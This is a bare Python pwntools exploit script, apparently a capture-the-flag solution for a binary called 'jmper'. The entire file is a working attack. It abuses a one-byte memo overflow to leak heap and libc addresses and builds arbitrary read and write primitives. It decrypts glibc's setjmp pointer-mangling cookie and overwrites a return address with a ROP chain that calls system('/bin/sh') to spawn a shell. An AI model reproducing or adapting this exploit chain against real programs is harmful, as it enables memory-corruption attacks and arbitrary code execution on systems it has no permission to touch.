#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./jmper'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

stdouttosys = -0x17bba0

def add_student(n = 1):
    for i in range(n):
        p.recvuntil(":)")
        p.sendline("1")
    return

def name_student(ID, name, sen =0 ):
    p.recvuntil(":)")
    p.sendline("2")
    p.recvuntil("ID:")
    p.sendline(str(ID))
    p.recvuntil("name:")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def write_memo(ID, memo, sen =0 ):
    p.recvuntil(":)")
    p.sendline("3")
    p.recvuntil("ID:")
    p.sendline(str(ID))
    p.recvuntil("memo:")
    if sen == 0:
        p.sendline(memo)
    else:
        p.send(memo)
    return

def show_name(ID):
    p.recvuntil(":)")
    p.sendline("4")
    p.recvuntil("ID:")
    p.sendline(str(ID))
    r = p.recvuntil("student.")
    return r

def show_memo(ID):
    p.recvuntil(":)")
    p.sendline("5")
    p.recvuntil("ID:")
    p.sendline(str(ID))
    r = p.recvuntil("student.")
    return r

def quit():
    p.recvuntil(":)")
    p.sendline("6")
    return

def rerol(Num):
    res = pwn.ror(Num, 0x11, 64)
    return res

def decrypt(Num,Cookie):
    Num = rerol(Num)
    result = Num^Cookie
    return result

add_student(4)
name_student(0,"/bin/sh\x00")
write_memo(0,"B"*0x20 + "\x58",1)

r = show_name(0)
r = r.split("1. Add")[0]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] Address on heap: "+hex(la)
jmpbuf = la - 0xf8

name_student(1,"AAA")
write_memo(1,"B"*0x20 +"\xc8")
name_student(1, pwn.p64(0x602010))

r = show_name(1)
r = r.split("1. Add")[0]
stdout = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] stdout is at: "+hex(stdout)

sys = stdout + stdouttosys
print "[+] system is at: "+hex(sys)

hn = la + 0x70
name_student(0, pwn.p64(hn))
binsh = la + 0x18

def read(address):
    name_student(0, pwn.p64(address))
    r = show_name(1)
    r = r.split("1. Add")[0]
    value = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
    return value

def write(address, value):
    name_student(0, pwn.p64(address))
    name_student(1, value)
    return

cookie = decrypt(read(jmpbuf+0x38), 0x400c31)
print "[+] Value of xor cookie: "+hex(cookie)

rsp = decrypt(read(jmpbuf+0x30), cookie)
print "[+] Value of rsp: "+hex(rsp)
ret = rsp + 0x18
print "[+] ret address stored at: "+hex(ret)

write(ret, pwn.p64(0x400cc3)) #pop rdi, ret
write(ret+0x8, pwn.p64(binsh)) #addr of /bin/sh\x00
write(ret+0x10, pwn.p64(sys))   #call system

add_student(26)
#trigger longjmp and spawn shell
p.recvuntil(":)")
p.sendline("1")
p.recvuntil(":)")

print "[+] Shell spawned."

p.interactive()
